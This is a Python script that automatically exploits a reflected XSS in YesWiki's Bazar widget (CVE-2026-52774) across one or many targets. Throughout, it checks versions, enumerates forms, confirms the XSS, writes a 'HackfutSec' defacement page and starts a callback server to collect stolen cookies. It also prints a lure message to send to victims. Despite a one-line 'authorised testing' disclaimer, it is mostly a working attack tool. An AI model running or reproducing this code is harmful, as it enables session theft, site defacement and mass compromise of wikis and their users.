#!/usr/bin/env python3
"""
YesWiki Bazar Widget Reflected XSS
Exploitation 100% Automatique
For AUTHORISED testing only.
"""

import argparse
import os
import sys
import threading
import time
import socket
import http.server
import socketserver
from datetime import datetime
from urllib.parse import urlparse

from core.colors import Colors
from core.http_client import HTTPClient
from core.utils import parse_targets_file, save_results

from exploit.detector import VersionDetector
from exploit.bazar_checker import BazarChecker
from exploit.form_enumerator import FormEnumerator
from exploit.xss_tester import XSSTester
from exploit.payload_generator import PayloadGenerator

from mass.scanner import MassScanner


class AutoHTTPServer:
    """Serveur HTTP automatique pour héberger la page de défacement."""
    
    def __init__(self, port=8888):
        self.port = port
        self.server = None
        self.thread = None
        self.public_url = None
    
    def start(self, directory="."):
        """Démarrer le serveur HTTP dans un thread séparé."""
        os.chdir(directory)
        
        handler = http.server.SimpleHTTPRequestHandler
        
        try:
            self.server = socketserver.TCPServer(("0.0.0.0", self.port), handler)
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            
            # Détecter l'IP publique
            self.public_url = self._get_public_url()
            
            return True
        except OSError as e:
            print(f"{Colors.error(f'Cannot start server on port {self.port}: {e}')}")
            return False
    
    def _get_public_url(self):
        """Détecter l'URL publique du serveur."""
        # Essayer de détecter l'IP locale
        try:
            # Obtenir l'IP locale
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return f"http://{local_ip}:{self.port}"
        except Exception:
            return f"http://localhost:{self.port}"
    
    def stop(self):
        """Arrêter le serveur."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()


class AutomaticExploiter:
    """Exploitation automatique complète."""
    
    def __init__(self, args):
        self.args = args
        self.http = HTTPClient(timeout=args.timeout)
        self.detector = VersionDetector(self.http)
        self.bazar_checker = BazarChecker(self.http)
        self.form_enumerator = FormEnumerator(self.http)
        self.xss_tester = XSSTester(self.http)
        self.payload_gen = PayloadGenerator()
        self.server = None
        self.results = []
    
    def exploit_single(self, url: str):
        """Exploitation automatique d'une cible unique."""
        print(f"\n{Colors.cyan('=' * 60)}")
        print(f"{Colors.bold(f'[*] AUTO-EXPLOITATION: {url}')}")
        print(f"{Colors.cyan('=' * 60)}")
        
        # Étape 1: Détection version
        print(f"\n{Colors.white('[1/6]')} Detecting version...", end=" ", flush=True)
        version, status = self.detector.detect(url)
        
        if version:
            from core.utils import is_vulnerable_version
            vulnerable = is_vulnerable_version(version)
            color = Colors.RED if vulnerable else Colors.GREEN
            print(f"{color}v{version}{Colors.RESET} {'(VULNERABLE)' if vulnerable else '(patched)'}")
            
            if not vulnerable:
                print(f"{Colors.patched('[SKIP] Target is patched')}")
                return None
        else:
            print(f"{Colors.yellow('unknown')} (status {status})")
        
        # Étape 2: Vérification Bazar
        print(f"{Colors.white('[2/6]')} Checking Bazar extension...", end=" ", flush=True)
        bazar = self.bazar_checker.check(url)
        print(f"{Colors.green('active')}" if bazar else f"{Colors.yellow('not found')}")
        
        if not bazar:
            print(f"{Colors.error('[SKIP] Bazar extension not found')}")
            return None
        
        # Étape 3: Énumération des formulaires
        print(f"{Colors.white('[3/6]')} Enumerating form IDs...", end=" ", flush=True)
        forms = self.form_enumerator.enumerate(url)
        
        if forms:
            print(f"{Colors.green(f'{len(forms)} valid')} — IDs: {', '.join(map(str, forms[:10]))}")
        else:
            print(f"{Colors.yellow('none found')}")
            return None
        
        # Étape 4: Test XSS
        form_id = forms[0]
        print(f"{Colors.white('[4/6]')} Testing XSS on form {form_id}...", end=" ", flush=True)
        vulnerable, status, snippet = self.xss_tester.test(url, form_id)
        
        if vulnerable:
            print(f"{Colors.vulnerable('VULNERABLE')}")
        else:
            print(f"{Colors.patched('not vulnerable')}")
            return None
        
        # Étape 5: Génération page de défacement
        print(f"{Colors.white('[5/6]')} Generating defacement page...", end=" ", flush=True)
        
        # Remplacer les placeholders
        deface_file = self.args.deface_output or "HackfutSec.html"
        xss_url = self.payload_gen.build_xss_url(url, form_id)
        
        # Créer la page avec les informations réelles
        self._generate_defacement_page(url, xss_url, deface_file)
        
        print(f"{Colors.green(f'saved: {deface_file}')}")
        
        # Étape 6: Démarrage serveur automatique
        print(f"{Colors.white('[6/6]')} Starting HTTP server...", end=" ", flush=True)
        
        if self.args.auto_server:
            self.server = AutoHTTPServer(self.args.server_port)
            if self.server.start():
                print(f"{Colors.green(f'running on {self.server.public_url}')}")
                
                # Générer l'URL d'exploitation avec callback
                callback_url = self.server.public_url
                exfil_url = self.payload_gen.build_xss_url(url, form_id, callback_url)
                
                print(f"\n{Colors.success('=' * 60)}")
                print(f"{Colors.success('EXPLOITATION COMPLÈTE - RÉSULTATS')}")
                print(f"{Colors.success('=' * 60)}")
                print(f"  {Colors.white('Target:')} {url}")
                print(f"  {Colors.white('Version:')} v{version}")
                print(f"  {Colors.white('Form ID:')} {form_id}")
                print(f"  {Colors.white('Defacement:')} {deface_file}")
                print(f"  {Colors.white('Server:')} {callback_url}")
                print(f"  {Colors.white('XSS URL:')}")
                print(f"    {Colors.red(xss_url)}")
                print(f"  {Colors.white('Cookie Exfil URL:')}")
                print(f"    {Colors.red(exfil_url)}")
                print(f"{Colors.success('=' * 60)}")
                
                # Message à envoyer à la victime
                print(f"\n{Colors.info('Message to send to victim:')}")
                print(f"  {Colors.white(f'Visit this URL: {xss_url}')}")
                print(f"  {Colors.white(f'Or open: http://{url}/HackfutSec.html')}")
                
                return {
                    "url": url,
                    "version": version,
                    "form_id": form_id,
                    "xss_url": xss_url,
                    "exfil_url": exfil_url,
                    "deface_file": deface_file,
                    "server_url": callback_url,
                }
            else:
                print(f"{Colors.error('failed to start server')}")
        else:
            print(f"{Colors.yellow('skipped (use --auto-server)')}")
            
            print(f"\n{Colors.success('=' * 60)}")
            print(f"{Colors.success('EXPLOITATION COMPLÈTE - RÉSULTATS')}")
            print(f"{Colors.success('=' * 60)}")
            print(f"  {Colors.white('Target:')} {url}")
            print(f"  {Colors.white('Version:')} v{version}")
            print(f"  {Colors.white('Form ID:')} {form_id}")
            print(f"  {Colors.white('Defacement:')} {deface_file}")
            print(f"  {Colors.white('XSS URL:')}")
            print(f"    {Colors.red(xss_url)}")
            print(f"{Colors.success('=' * 60)}")
        
        return {
            "url": url,
            "version": version,
            "form_id": form_id,
            "xss_url": xss_url,
            "deface_file": deface_file,
        }
    
    def _generate_defacement_page(self, victim_url, xss_url, outfile):
        """Générer la page de défacement avec les informations réelles."""
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Lire le template
        template_path = os.path.join(os.path.dirname(__file__), "defacement_template.html")
        
        if os.path.exists(template_path):
            with open(template_path, "r", encoding="utf-8") as f:
                html = f.read()
        else:
            # Utiliser le générateur intégré
            html = self.payload_gen.build_defacement_page(victim_url, self.args.hacker_name)
        
        # Remplacer les placeholders
        html = html.replace("[VICTIM_URL]", victim_url)
        html = html.replace("[DATE_TIME]", current_time)
        html = html.replace("[SYSTEM_COMPROMISED]", "SYSTEM_COMPROMISED")
        html = html.replace("[XSS_URL]", xss_url)
        
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(html)
    
    def run_mass(self, targets):
        """Exploitation automatique en masse."""
        print(f"\n{Colors.cyan('=' * 60)}")
        print(f"{Colors.bold(f'[*] AUTO-EXPLOITATION: {len(targets)} targets')}")
        print(f"{Colors.cyan('=' * 60)}")
        
        for i, target in enumerate(targets, 1):
            print(f"\n{Colors.bold(f'[{i}/{len(targets)}]')}")
            result = self.exploit_single(target)
            if result:
                self.results.append(result)
        
        # Sauvegarder tous les résultats
        if self.results:
            with open("auto_exploit_results.txt", "w") as f:
                f.write("=" * 60 + "\n")
                f.write("AUTO-EXPLOITATION RESULTS\n")
                f.write(f"Date: {datetime.now().isoformat()}\n")
                f.write("=" * 60 + "\n\n")
                
                for result in self.results:
                    f.write(f"Target: {result['url']}\n")
                    f.write(f"Version: {result.get('version', 'unknown')}\n")
                    f.write(f"Form ID: {result.get('form_id', '?')}\n")
                    f.write(f"XSS URL: {result.get('xss_url', 'N/A')}\n")
                    f.write("-" * 40 + "\n")
            
            print(f"\n{Colors.success(f'Results saved: auto_exploit_results.txt')}")
        
        # Arrêter le serveur à la fin
        if self.server:
            print(f"\n{Colors.warning('Stopping HTTP server...')}")
            self.server.stop()
    
    def close(self):
        """Cleanup."""
        self.http.close()
        if self.server:
            self.server.stop()


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-52774 — YesWiki Bazar Widget Reflected XSS - AUTO EXPLOITATION"
    )
    
    parser.add_argument("-t", "--target", help="Target URL")
    parser.add_argument("--targets", help="Targets file (default: list.txt)")
    parser.add_argument("--auto-server", action="store_true", default=True,
                       help="Auto-start HTTP server for cookie exfiltration")
    parser.add_argument("--server-port", type=int, default=8888,
                       help="HTTP server port (default: 8888)")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--max-id", type=int, default=30)
    parser.add_argument("--deface-output", default="HackfutSec.html")
    parser.add_argument("--hacker-name", default="HackfutSec")
    parser.add_argument("--no-color", action="store_true")
    
    args = parser.parse_args()
    
    if args.no_color:
        Colors.disable()
    
    # Print banner
    Colors.print_banner()
    
    print(f"{Colors.info('MODE: AUTOMATIC EXPLOITATION')}")
    print(f"{Colors.info(f'Server: auto-start on port {args.server_port}')}")
    print(f"{Colors.info(f'Defacement: {args.deface_output}')}")
    print()
    
    # Vérifier les cibles
    if args.target:
        targets = [args.target.rstrip("/")]
    elif args.targets:
        try:
            targets = parse_targets_file(args.targets)
        except IOError as e:
            print(Colors.error(str(e)))
            sys.exit(1)
    else:
        # Utiliser list.txt par défaut
        try:
            targets = parse_targets_file("list.txt")
        except IOError:
            print(Colors.error("No targets specified. Use -t or --targets"))
            sys.exit(1)
    
    if not targets:
        print(Colors.error("No valid targets found"))
        sys.exit(1)
    
    # Créer l'exploiteur
    exploiter = AutomaticExploiter(args)
    
    try:
        if len(targets) == 1:
            # Exploitation unique
            result = exploiter.exploit_single(targets[0])
            
            if result and args.auto_server:
                print(f"\n{Colors.warning('Server running... Press Ctrl+C to stop')}")
                
                # Garder le serveur en vie
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{Colors.warning('Stopping server...')}")
        else:
            # Exploitation en masse
            exploiter.run_mass(targets)
    finally:
        exploiter.close()


if __name__ == "__main__":
    main()
